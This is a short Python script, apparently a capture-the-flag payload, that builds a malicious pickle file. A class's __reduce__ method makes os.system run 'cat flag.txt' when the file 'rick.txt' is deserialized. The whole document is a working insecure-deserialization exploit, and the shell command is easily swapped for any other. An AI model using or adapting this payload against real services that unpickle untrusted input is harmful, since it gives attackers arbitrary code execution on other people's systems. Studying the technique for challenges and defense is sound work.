# payload.py
import pickle
import os

# Define a malicious class
class Malicious:
    def __reduce__(self):
        # This method is called during deserialization.
        # Return a tuple where the first element is a callable (e.g., `os.system`) and the second element is a tuple of arguments.
        return (os.system, ("cat flag.txt",))

# Create an instance of the malicious class
malicious_instance = Malicious()

# Serialize the malicious instance
with open('rick.txt', 'wb') as f:
    pickle.dump(malicious_instance, f)
